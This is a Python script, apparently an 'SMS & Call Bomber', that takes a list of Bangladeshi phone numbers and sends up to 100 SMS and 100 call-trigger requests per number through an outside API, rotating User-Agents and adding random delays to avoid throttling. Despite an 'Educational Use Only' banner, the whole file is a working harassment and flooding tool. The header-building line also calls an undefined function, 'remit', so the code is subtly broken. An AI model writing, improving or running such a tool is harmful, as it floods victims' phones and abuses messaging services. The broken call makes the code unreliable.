import requests
import time
import random
import sys
import os

# ANSI escape codes for colors
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

# ASCII Art
SM_ART = f"""
{Colors.CYAN}
                          _____ __  __ 
                        / ____|  \/  |
                       | (___ | \✨/ |
                        \___ \| |\/| |
                        ____) | |  | |
                       |_____/|_|  |_|

                 {Colors.YELLOW}=== SM CORPORATE 🍁 SM & Call Bomber ==={Colors.RESET}
                 Coded by: SM 🍁 
                 For Educational Use Only!
"""

# API configuration
API = {
    "name": "Trial API",
    "url": "https://bomberdemofor2hrtcs.vercel.app/api/trialapi",
    "method": "GET",
    "params": {"phone": "{number}", "type": "{type}"}
}

# Random User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

def clear_screen():
    try:
        os.system("clear" if os.name == "posix" else "cls")
    except Exception:
        print("\n" * 50)  # Fallback for Termux issues

def validate_phone(phone):
    return phone.strip().isdigit() and len(phone.strip()) == 11 and phone.strip().startswith("01")

def send_request(phone, request_type):
    url = API["url"]
    params = {key: value.replace("{number}", phone).replace("{type}", request_type) for key, value in API["params"].items()}
    headers = {"User-Agent": remit(random.choice(USER_AGENTS))}

    try:
        response = requests.get(url, params=params, headers=headers, timeout=10)
        print(f"{Colors.YELLOW}Debug: Raw API response for {request_type.upper()} to {phone}: {response.text}{Colors.RESET}")
        return {"success": True, "status": f"Success (HTTP {response.status_code})"}
    except requests.RequestException as e:
        return {"success": False, "status": f"Unsuccessful: {str(e)}"}

def main():
    clear_screen()
    print(SM_ART)
    
    # Phone numbers input
    try:
        phone_input = input(f"{Colors.CYAN}Enter Bangladeshi numbers (e.g., 01712345678,01987654321): {Colors.RESET}").strip()
        phone_numbers = [phone.strip() for phone in phone_input.split(",") if phone.strip()]
        
        # Validate phone numbers
        if not phone_numbers:
            print(f"{Colors.RED}No valid numbers entered!{Colors.RESET}")
            input("Press Enter to exit...")
            return
        for phone in phone_numbers:
            if not validate_phone(phone):
                print(f"{Colors.RED}Invalid number {phone}! Must be 11 digits starting with 01.{Colors.RESET}")
                input("Press Enter to exit...")
                return
    except Exception as e:
        print(f"{Colors.RED}Error in phone input: {str(e)}{Colors.RESET}")
        input("Press Enter to exit...")
        return

    # Count input for SMS and Calls
    try:
        sms_count = int(input(f"{Colors.CYAN}Enter number of SMS requests per number (0-100): {Colors.RESET}").strip())
        call_count = int(input(f"{Colors.CYAN}Enter number of Call requests per number (0-100): {Colors.RESET}").strip())
        if not (0 <= sms_count <= 100 and 0 <= call_count <= 100):
            raise ValueError("Counts must be between 0 and 100")
        if sms_count == 0 and call_count == 0:
            print(f"{Colors.RED}Both SMS and Call counts cannot be 0!{Colors.RESET}")
            input("Press Enter to exit...")
            return
    except ValueError as e:
        print(f"{Colors.RED}Invalid count! {str(e)}{Colors.RESET}")
        input("Press Enter to exit...")
        return

    # Delay input
    try:
        delay = float(input(f"{Colors.CYAN}Enter delay between requests (seconds, e.g., 2): {Colors.RESET}").strip())
        if delay < 0:
            raise ValueError("Delay must be non-negative")
    except ValueError as e:
        print(f"{Colors.RED}Invalid delay! {str(e)}{Colors.RESET}")
        input("Press Enter to exit...")
        return

    total_requests_per_number = sms_count + call_count
    total_requests = total_requests_per_number * len(phone_numbers)
    print(f"\n{Colors.YELLOW}Starting bombing to {len(phone_numbers)} numbers with {sms_count} SMS requests and {call_count} call requests per number (delay: {delay}s)...{Colors.RESET}")
    print(f"{Colors.YELLOW}Note: Each SMS request may trigger multiple messages (e.g., 10 SMS).{Colors.RESET}")

    request_counter = 0
    for phone in phone_numbers:
        # Only include request types with count > 0
        request_list = []
        if sms_count > 0:
            request_list.extend([("sms", API) for _ in range(sms_count)])
        if call_count > 0:
            request_list.extend([("call", API) for _ in range(call_count)])
        random.shuffle(request_list)

        if not request_list:
            print(f"{Colors.RED}No requests to send for {phone}!{Colors.RESET}")
            continue

        print(f"\n{Colors.CYAN}Bombing number: {phone}{Colors.RESET}")
        for request_type, _ in request_list:
            request_counter += 1
            try:
                result = send_request(phone, request_type)
                if result["success"]:
                    print(f"{Colors.GREEN}[{request_counter}/{total_requests}] {API['name']} ({request_type.upper()} to {phone}): {result['status']}{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[{request_counter}/{total_requests}] {API['name']} ({request_type.upper()} to {phone}): {result['status']}{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}[{request_counter}/{total_requests}] {API['name']} ({request_type.upper()} to {phone}): Unsuccessful: {str(e)}{Colors.RESET}")
            time.sleep(delay + random.uniform(0, 1))

    print(f"\n{Colors.GREEN}SMS and Call bombing completed successfully!{Colors.RESET}")
    input("Press Enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}Stopped by user.{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}Unexpected error: {str(e)}{Colors.RESET}")
        input("Press Enter to exit...")
